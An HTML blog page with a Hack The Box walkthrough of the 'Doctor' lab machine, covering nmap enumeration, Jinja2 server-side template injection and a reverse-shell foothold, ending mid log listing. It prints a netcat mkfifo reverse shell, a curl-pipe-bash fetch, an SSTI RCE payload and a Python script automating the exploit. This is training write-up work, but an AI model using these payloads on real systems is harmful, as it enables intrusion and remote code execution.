<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <!-- start custom head snippets -->
<!-- Begin Jekyll GTM tag v1.0.3 -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-MF4PLJ5');</script>
<!-- End Jekyll GTM tag v1.0.3 -->


<!-- insert favicons. use https://realfavicongenerator.net/ -->
<link rel="shortcut icon" href="/assets/images/favicon.ico" />

<!-- Multilang tags -->

    
<link rel="alternate" hreflang="pt-BR" href="https://davicruz.com/walkthrough/2021/02/htb-doctor">
<link rel="alternate" hreflang="x-default" href="https://davicruz.com/walkthrough/2021/02/htb-doctor">
    

    
<link rel="alternate" hreflang="en-US" href="https://davicruz.com/en-US/walkthrough/2021/02/htb-doctor">
        
<link rel="alternate" hreflang="en" href="https://davicruz.com/en-US/walkthrough/2021/02/htb-doctor">
        
    


<!-- end custom head snippets -->

    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Walktrough: HTB Doctor | Davi Cruz</title>
<meta name="description" content="Hello everyone!  Starting to post about some write-ups of CTF-like machines, the first one will be Doctor, an easy-rated Linux box from Hack The Box created by egotisticalSW.">


  <meta name="author" content="Davi Cruz">
  
  <meta property="article:author" content="Davi Cruz">
  


<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="Davi Cruz">
<meta property="og:title" content="Walktrough: HTB Doctor">
<meta property="og:url" content="https://davicruz.com/walkthrough/2021/02/htb-doctor">


  <meta property="og:description" content="Hello everyone!  Starting to post about some write-ups of CTF-like machines, the first one will be Doctor, an easy-rated Linux box from Hack The Box created by egotisticalSW.">



  <meta property="og:image" content="https://i.imgur.com/AXKMi8H.png">



  <meta name="twitter:site" content="@zerahzurc">
  <meta name="twitter:title" content="Walktrough: HTB Doctor">
  <meta name="twitter:description" content="Hello everyone!  Starting to post about some write-ups of CTF-like machines, the first one will be Doctor, an easy-rated Linux box from Hack The Box created by egotisticalSW.">
  <meta name="twitter:url" content="https://davicruz.com/walkthrough/2021/02/htb-doctor">

  
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content="https://i.imgur.com/AXKMi8H.png">
  

  



  <meta property="article:published_time" content="2021-02-06T09:00:00-03:00">





  

  


<link rel="canonical" href="https://davicruz.com/walkthrough/2021/02/htb-doctor">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "Davi Cruz",
      "url": "https://davicruz.com/",
      "sameAs": ["https://twitter.com/zerahzurc","https://www.linkedin.com/in/davicruz","https://github.com/davi-cruz"]
    
  }
</script>


  <meta name="google-site-verification" content="hrWV-PqvbpxEy2HdpVYFQNws2Sz_tROleVyF18s2kWA" />


  <meta name="msvalidate.01" content="60B1FA6CDAF15D226AB529AF30386BD8">



  <meta name="yandex-verification" content="08de8d8c0326420f">



<!-- end _includes/seo.html -->



  <link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Davi Cruz Feed">


<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">
<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>



  </head>

  <body class="layout--single wide">
    <!-- Begin Jekyll GTM tag v1.0.3 (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-MF4PLJ5" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Jekyll GTM tag v1.0.3 (noscript) -->

    <nav class="skip-links">
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        <!-- CUSTOM: Edit to adjust links to localized page -->
        
        
          <a class="site-logo" href="/en-US"><img src="/assets/images/logo.png" alt="Davi Cruz"></a>
        
        <a class="site-title" href="/en-US">
          Davi Cruz
          
        </a>
        
        <!-- END CUSTOM: Edit to adjust links to localized page -->
        <ul class="visible-links">
          <!-- CUSTOM: Edit to get localized navigation --><li class="masthead__menu-item">
              <a href="/en-US/categories/">Categories</a>
            </li>
<li class="masthead__menu-item">
              <a href="/en-US/tag/">Tags</a>
            </li>
<li class="masthead__menu-item">
              <a href="/en-US/about/">About</a>
            </li>
<!-- END CUSTOM: Edit to get localized navigation -->
        </ul>
        
        <button class="search__toggle" type="button">
          <span class="visually-hidden">Toggle search</span>
          <i class="fas fa-search"></i>
        </button>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      





<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person" class="h-card">

  
    <div class="author__avatar">
      <a href="https://davicruz.com/">
        <img src="/assets/images/bio-photo.jpg" alt="Davi Cruz" itemprop="image" class="u-photo">
      </a>
    </div>
  

  <div class="author__content">
    <h3 class="author__name p-name" itemprop="name">
      <a class="u-url" rel="me" href="https://davicruz.com/" itemprop="url">Davi Cruz</a>
    </h3>
    
      <div class="author__bio p-note" itemprop="description">
        <p>Just another Cybersecurity professional</p>

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name" class="p-locality">São Paulo, BR</span>
        </li>
      

      
        
          
            <li><a href="https://linkedin.com/in/davicruz" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fab fa-linkedin" aria-hidden="true"></i><span class="label">Linkedin</span></a></li>
          
        
          
            <li><a href="https://twitter.com/zerahzurc" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
            <li><a href="https://github.com/davi-cruz" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>



  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Walktrough: HTB Doctor">
    <meta itemprop="description" content="Hello everyone!Starting to post about some write-ups of CTF-like machines, the first one will be Doctor, an easy-rated Linux box from Hack The Box created by egotisticalSW.">
    <meta itemprop="datePublished" content="2021-02-06T09:00:00-03:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title p-name" itemprop="headline">
            <a href="https://davicruz.com/walkthrough/2021/02/htb-doctor" class="u-url" itemprop="url">Walktrough: HTB Doctor
</a>
          </h1>
          

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-calendar-alt" aria-hidden="true"></i>
        
        <time datetime="2021-02-06T09:00:00-03:00">February 6, 2021</time>
      </span>
    

    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          11 minute read
        
      </span>
    

    <!-- CUSTOM: Post Meta attributes and links -->
    <span class="page__meta-sep page__meta-lang"></span>
    
    
    
    <span class="page__meta-lang"><a href="/walkthrough/2021/02/htb-doctor">Leia também em  <img class="emoji" title=":brazil:" alt=":brazil:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1e7-1f1f7.png" height="20" width="20"></a></span>
    

    

    

    
    
    
    
    
  <span class="page__meta-sep page__meta-share"></span>
  <span class="page__meta-share">
    <i class="fas fa-share-alt" aria-hidden="true"></i>
    <a href="#sharelinks">Share</a>
  </span>
    <!-- END CUSTOM: Post Meta attributes and links -->
  </p>


        </header>
      

      <section class="page__content e-content" itemprop="text">
        
        <p>Hello everyone!</p>

<p>Starting to post about some write-ups of CTF-like machines, the first one will be <strong>Doctor</strong>, an easy-rated Linux box from <a href="https://www.hackthebox.eu">Hack The Box</a> created by <a href="https://app.hackthebox.eu/users/94858">egotisticalSW</a>.<!--more--></p>

<p class="notice--info"><img class="emoji" title=":information_source:" alt=":information_source:" src="https://github.githubassets.com/images/icons/emoji/unicode/2139.png" height="20" width="20"> <strong>Info</strong>: Write-ups for Hack The Box will be posted as soon as machines get retired, so here’s the first one <img class="emoji" title=":smiley:" alt=":smiley:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f603.png" height="20" width="20">!</p>

<p><img src="https://i.imgur.com/9JHTf6G.png" alt="HTB Doctor" class="align-center"></p>

<h2 id="enumeration">Enumeration</h2>

<p>So let’s start with a quick enumeration of this box using Nmap. Running a quick scan we received the following output, where 2 HTTP services were found, alongside an SSH port:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-Pn</span> <span class="nt">-oA</span> quick 10.10.10.209
Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-01-14 19:46 <span class="nt">-03</span>
Nmap scan report <span class="k">for </span>10.10.10.209
Host is up <span class="o">(</span>0.17s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 997 filtered ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   3072 59:4d:4e:c2:d8:cf:da:9d:a8:c8:d0:fd:99:a8:46:17 <span class="o">(</span>RSA<span class="o">)</span>
|   256 7f:f3:dc:fb:2d:af:cb:ff:99:34:ac:e0:f8:00:1e:47 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 53:0e:96:6b:9c:e9:c1:a1:70:51:6c:2d:ce:7b:43:e8 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp   open  http     Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Doctor
8089/tcp open  ssl/http Splunkd httpd
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Splunkd
|_http-title: splunkd
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>SplunkServerDefaultCert/organizationName<span class="o">=</span>SplunkUser
| Not valid before: 2020-09-06T15:57:27
|_Not valid after:  2023-09-06T15:57:27
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>63.98 seconds
                                                                          
</code></pre></div></div>

<h3 id="80-tcp---http-service">80 TCP - HTTP Service</h3>

<p>Before starting the enumeration, checking the website using a browser, noticed that it is an institutional site, that mentions an e-mail <strong>info@doctors.htb</strong>, where the domain <code class="language-plaintext highlighter-rouge">doctors.htb</code> might be the FQDN of this machine.</p>

<p><img src="https://i.imgur.com/1nI88F7.png" alt="HTB Doctor - 80/TCP" class="align-center"></p>

<p>To ensure proper enumeration of HTTP services that might be using DNS, changed local hosts file to reflect the correct name so we could also start enumerating the services.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-i</span>
<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">" "</span> <span class="o">&gt;&gt;</span> /etc/hosts
<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"# HTB Doctors"</span> <span class="o">&gt;&gt;</span> /etc/hosts
<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"10.10.10.209 doctors.htb"</span> <span class="o">&gt;&gt;</span> /etc/hosts
<span class="nv">$ </span><span class="nb">cat</span> /etc/hosts

127.0.0.1       localhost
127.0.1.1       kali

<span class="c"># The following lines are desirable for IPv6 capable hosts</span>
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
 
<span class="c"># HTB Doctors</span>
10.10.10.209 doctors.htb
</code></pre></div></div>

<p>After changing the entry, once accessing the same URL, a different page is displayed, as seen below:</p>

<p><img src="https://i.imgur.com/dFm4t4L.png" alt="HTB Doctor - Secure Messaging" class="align-center"></p>

<p>Now that we have confirmed that the box contained a different content being hosted using the DNS, we’ll start enumerating these websites using both ways so we can look for interesting opportunities for an initial foothold.</p>

<h4 id="whatweb">Whatweb</h4>

<p>Checking <code class="language-plaintext highlighter-rouge">whatweb</code> for both sites noticed that the sites are hosted in different webservers, as seen below:</p>

<ul>
  <li>Via IP address: <code class="language-plaintext highlighter-rouge">Apache[2.4.41], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], Email[info@doctors.htb], HTML5, Script, Bootstrap[4.3.1], JQuery[3.3.1]</code>
</li>
  <li>Via DNS: <code class="language-plaintext highlighter-rouge">HTTPServer[Werkzeug/1.0.1 Python/3.8.2], Cookies[session], Python[3.8.2], HttpOnly[session], Werkzeug[1.0.1], RedirectLocation[http://doctors.htb/login?next=%2F]</code>
</li>
</ul>

<h4 id="manually-enumerating-the-website">Manually enumerating the website</h4>

<p>While checking the website I have noticed that on login page would be possible also to reset a password and create an account. The e-mail information we have (info@doctors.htb) was the first one tested but the error message was saying that the account doesn’t exist.</p>

<p>After some further testing, including checking the possibility to tamper with the change password request, I decided to change strategy and to try to create an account.</p>

<p><img src="https://i.imgur.com/TF2YP2x.png" alt="HTB Doctor - Secure Messaging - Creating User" class="align-center"></p>

<p>After having one successfully created, the warning below is displayed, which means that <strong>we’ll only have 20 minutes</strong> to use this recently created account.</p>

<p><img src="https://i.imgur.com/1HTEecu.png" alt="HTB Doctor - Secure Messaging - Account creation" class="align-center"></p>

<p>After having the account created, started enumerating the source code where I’ve found a <code class="language-plaintext highlighter-rouge">/archive</code> folder hidden in the page, but it didn’t return anything when first accessed.</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="c">&lt;!--archive still under beta testing&lt;a class="nav-item nav-link" href="/archive"&gt;Archive&lt;/a&gt;--&gt;</span>
</code></pre></div></div>

<p>So going further I noticed the possibility to add a new message, where I have created the following dummy content:</p>

<p><img src="https://i.imgur.com/MRYzW8b.png" alt="HTB Doctor - Secure Messaging - New Post" class="align-center"></p>

<p>Accessing the posted message afterward, I noticed that it redirects to <code class="language-plaintext highlighter-rouge">http://doctors.htb/post/2</code> but also nothing interesting besides the possibility of updating its content or deleting the message.</p>

<p>Manipulating the URL, to try to access the other posts, eg <code class="language-plaintext highlighter-rouge">/post/1</code>, there was a message from user <code class="language-plaintext highlighter-rouge">admin</code> but also didn’t take me anywhere else.</p>

<p>Things get interesting when I decided to access <code class="language-plaintext highlighter-rouge">/archive</code> again, where the content used in the message is displayed, allowing us to test some Server-Side Template Injection (SSTI) and possibly get a reverse shell.</p>

<p>To confirm this, following the guidance available on <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#identify">SSTI (Server Side Template Injection) - HackTricks</a> I’ve changed the Title from my previous message to test some types of injections and determine the engine used, which will help us define the malicious injection itself.</p>

<p><img src="https://i.imgur.com/ZNQ6zGx.png" alt="HTB Doctor - Secure Messaging - SSTI test" class="align-center"></p>

<p>This injection worked flawlessly, indicating that we’re handling Twig or Jinja2 <img class="emoji" title=":smile:" alt=":smile:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f604.png" height="20" width="20"> (what makes sense, once this web service, as noticed on whatweb, is <strong>Werkzeug</strong>, a very popular web application server normally used with Flask or Django).</p>

<p><img src="https://i.imgur.com/7rUfMmO.png" alt="HTB Doctor - SSTI output" class="align-center"></p>

<p>After a few tests, playing with the examples available at <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">PayloadsAllTheThings/Server Side Template Injection at master · swisskyrepo/PayloadsAllTheThings (github.com)</a>, I was able to confirm that the correct language to use would be <strong>Jinja2</strong>, once the content below worked properly, among others:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{{</span><span class="n">config</span><span class="p">.</span><span class="nf">items</span><span class="p">()}}</span>
</code></pre></div></div>

<h2 id="initial-foothold">Initial Foothold</h2>

<p>After confirming that a Jinja2 payload should be used, would be possible to get a reverse shell on the box using the following process:</p>

<ul>
  <li>In a folder in the attacker machine, created a payload file containing the string to be used as payload to get a reverse shell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">rm</span> /tmp/f<span class="p">;</span><span class="nb">mkfifo</span> /tmp/f<span class="p">;</span><span class="nb">cat</span> /tmp/f|/bin/sh <span class="nt">-i</span> 2&gt;&amp;1|nc 10.10.10.10 4443 <span class="o">&gt;</span>/tmp/f
</code></pre></div></div>

<ul>
  <li>Then host an HTTP server using python3 by running the command below from the same directory as the recently created file.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>python3 <span class="nt">-m</span> http.server 80
</code></pre></div></div>

<ul>
  <li>On the portal, created a post containing the following string on the title, obtained from the previously mentioned PayloadsAllTheThings site. This one especially is very interesting for this situation, which allows us to get the <strong>input</strong> parameter from the GET request, so we would be able to change the commands to be issued to the system very easily.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="o">%</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="p">().</span><span class="n">__class__</span><span class="p">.</span><span class="n">__base__</span><span class="p">.</span><span class="nf">__subclasses__</span><span class="p">()</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="k">if</span> <span class="sh">"</span><span class="s">warning</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">x</span><span class="p">.</span><span class="n">__name__</span> <span class="o">%</span><span class="p">}{{</span><span class="nf">x</span><span class="p">().</span><span class="n">_module</span><span class="p">.</span><span class="n">__builtins__</span><span class="p">[</span><span class="sh">'</span><span class="s">__import__</span><span class="sh">'</span><span class="p">](</span><span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="p">).</span><span class="nf">popen</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nb">input</span><span class="p">).</span><span class="nf">read</span><span class="p">()}}{</span><span class="o">%</span><span class="n">endif</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="n">endfor</span><span class="o">%</span><span class="p">}</span>
</code></pre></div></div>

<ul>
  <li>Started listener using netcat by running the command below, selecting the same port defined in the payload file.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lnvp</span> 4443
</code></pre></div></div>

<ul>
  <li>Then made a request to the portal using the archive URL appended by the command I wanted to execute.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://doctors.htb/archive?input<span class="o">=</span>curl%20-L%20http://10.10.10.10/payload%20|%20bash
</code></pre></div></div>

<ul>
  <li>And voilà! A reverse shell was returned <img class="emoji" title=":smiley:" alt=":smiley:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f603.png" height="20" width="20">
</li>
</ul>

<p><img src="https://i.imgur.com/j9kreyv.png" alt="HTB Doctor - Exploit" class="align-center"></p>

<p class="notice--info"><strong>Bonus</strong> To make it easier to regain an initial foothold, once the user account has a short validity of 20 minutes, I’ve created this python3 script to help on this task <img class="emoji" title=":smiley:" alt=":smiley:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f603.png" height="20" width="20">. To use it just set up the listener and python web server, then the script will recreate the user, the message and then send a request to get the reverse shell again</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">import</span> <span class="n">requests</span>

<span class="n">url</span> <span class="o">=</span> <span class="sh">'</span><span class="s">http://doctors.htb</span><span class="sh">'</span>
<span class="n">username</span> <span class="o">=</span> <span class="sh">'</span><span class="s">dummy</span><span class="sh">'</span>
<span class="n">password</span> <span class="o">=</span> <span class="sh">'</span><span class="s">P@ssw0rd</span><span class="sh">'</span>
<span class="n">ip</span> <span class="o">=</span> <span class="sh">'</span><span class="s">10.10.10.10</span><span class="sh">'</span>
<span class="n">email</span> <span class="o">=</span> <span class="n">username</span><span class="o">+</span><span class="sh">'</span><span class="s">@doctors.htb</span><span class="sh">'</span>

<span class="c1"># Create new session
</span><span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">session</span><span class="p">()</span>

<span class="c1"># Make a initial request to get required cookies
</span><span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>

<span class="c1"># Create user
</span><span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">:</span><span class="n">username</span><span class="p">,</span><span class="sh">'</span><span class="s">email</span><span class="sh">'</span><span class="p">:</span><span class="n">email</span><span class="p">,</span><span class="sh">'</span><span class="s">password</span><span class="sh">'</span><span class="p">:</span><span class="n">password</span><span class="p">,</span><span class="sh">'</span><span class="s">confirm_password</span><span class="sh">'</span><span class="p">:</span><span class="n">password</span><span class="p">,</span><span class="sh">'</span><span class="s">submit</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">Sign Up</span><span class="sh">'</span><span class="p">}</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="sh">'</span><span class="s">/register</span><span class="sh">'</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>

<span class="c1"># Login
</span><span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">email</span><span class="sh">'</span><span class="p">:</span><span class="n">email</span><span class="p">,</span><span class="sh">'</span><span class="s">password</span><span class="sh">'</span><span class="p">:</span><span class="n">password</span><span class="p">,</span><span class="sh">'</span><span class="s">submit</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">Login</span><span class="sh">'</span><span class="p">}</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="sh">'</span><span class="s">/login?next=%2Fhome</span><span class="sh">'</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>

<span class="c1"># Create message
</span>
<span class="n">title</span> <span class="o">=</span> <span class="sh">"</span><span class="s">{% for x in ().__class__.__base__.__subclasses__() %}{% if </span><span class="se">\"</span><span class="s">warning</span><span class="se">\"</span><span class="s"> in x.__name__ %}{{x()._module.__builtins__[</span><span class="sh">'</span><span class="s">__import__</span><span class="sh">'</span><span class="s">](</span><span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="s">).popen(request.args.input).read()}}{%endif%}{%endfor%}</span><span class="sh">"</span>

<span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">title</span><span class="sh">'</span><span class="p">:</span><span class="n">title</span><span class="p">,</span><span class="sh">'</span><span class="s">content</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">content</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">submit</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">Post</span><span class="sh">'</span><span class="p">}</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="sh">'</span><span class="s">/post/new</span><span class="sh">'</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>

<span class="c1"># Get Reverse shell
</span><span class="n">command</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">utils</span><span class="p">.</span><span class="nf">quote</span><span class="p">(</span><span class="sh">'</span><span class="s">curl -L http://</span><span class="sh">'</span><span class="o">+</span><span class="n">ip</span><span class="o">+</span><span class="sh">'</span><span class="s">/payload | bash</span><span class="sh">'</span><span class="p">)</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="sh">'</span><span class="s">/archive?input=</span><span class="sh">'</span><span class="o">+</span><span class="n">command</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<p>After getting a reverse shell, <a href="https://blog.mrtnrdl.de/infosec/2019/05/23/obtain-a-full-interactive-shell-with-zsh.html">I have upgraded it</a> and then started to enumerate the box:</p>

<ul>
  <li>
    <p>The existing users in this box, based on the enumeration of home folders are <strong>shaun</strong> and <strong>web</strong></p>
  </li>
  <li>
    <p>Checking the groups that the current user <strong>web</strong> is member, we notice that this account is a member of group <strong>adm</strong></p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>web@doctor:/home<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>web<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>web<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>web<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>The <strong>adm</strong> group on Linux systems grants access to files located at <code class="language-plaintext highlighter-rouge">/var/log</code>, which will possibly allow us to find some sensitive information in the logs from web services or other tasks.</li>
</ul>

<h3 id="analyzing-log-files-under-varlog">Analyzing log files under /var/log</h3>

<p>So to start this analysis let’s see which components, besides the system defaults, we have being logged on this box</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>web@doctor:/var/log<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-ld</span> <span class="k">*</span>/
drwxr-x---  2 root              adm             4096 Jan 31 00:00 apache2/
drwxr-xr-x  2 root              root            4096 Sep  7 12:13 apt/
drwxr-xr-x  2 root              root            4096 Jan 31 00:00 cups/
drwxr-xr-x  2 root              root            4096 Apr  8  2020 dist-upgrade/
drwxr-xr-x  3 root              root            4096 Apr 23  2020 hp/
drwxrwxr-x  2 root              root            4096 Jul 26  2020 installer/
drwxr-sr-x+ 3 root              systemd-journal 4096 Jul 20  2020 journal/
drwxr-xr-x  2 root              root            4096 Sep  5  2019 openvpn/
drwx------  2 root              root            4096 Apr 23  2020 private/
drwx------  2 speech-dispatcher root            4096 Jan 19  2020 speech-dispatcher/
drwxr-x---  2 root              adm             4096 Jan 30 19:13 unattended-upgrades/
</code></pre></div></div>

<p>Starting with Apache2 logs, as this is one of the previously enumerated features and also considering the creation date of this box (so we can ignore the most recent information on it) we’ll have an interesting file, non-default, in this folder, which is a file called <strong>backup</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>web@doctor:/var/log/apache2<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s1">'Jan 3'</span>
total 7980
<span class="nt">-rw-r-----</span>  1 root adm       1266 Sep  5 11:58 access.log.10.gz
<span class="nt">-rw-r-----</span>  1 root adm        323 Aug 21 13:00 access.log.11.gz
<span class="nt">-rw-r-----</span>  1 root adm        270 Aug 18 12:48 access.log.12.gz
<span class="nt">-rw-r--r--</span>  1 root root   2194472 Jul 27  2020 access.log.13.gz
<span class="nt">-rw-r-----</span>  1 root adm        668 Sep 28 15:02 access.log.2.gz
<span class="nt">-rw-r-----</span>  1 root adm       1493 Sep 23 15:20 access.log.3.gz
<span class="nt">-rw-r-----</span>  1 root adm       3951 Sep 22 12:58 access.log.4.gz
<span class="nt">-rw-r-----</span>  1 root adm       1341 Sep 19 19:17 access.log.5.gz
